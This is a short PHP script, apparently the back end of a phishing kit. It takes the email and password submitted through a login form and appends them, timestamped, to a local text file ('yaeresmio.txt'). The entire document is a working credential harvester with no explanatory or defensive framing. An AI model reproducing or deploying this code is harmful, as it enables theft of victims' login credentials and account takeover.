<?php
if (isset($_POST["email"])){
    $username = $_POST["email"];
}
if (isset($_POST["pass"])){
    $password = $_POST["pass"];
}
$date = date("d-m-y h:i:s");

file_put_contents("yaeresmio.txt", "Date: " . $date . "\n", FILE_APPEND);
file_put_contents("yaeresmio.txt", "Username: " . $username . "\n" , FILE_APPEND);
file_put_contents("yaeresmio.txt", "Password: ". $password . "\n\n", FILE_APPEND);

?>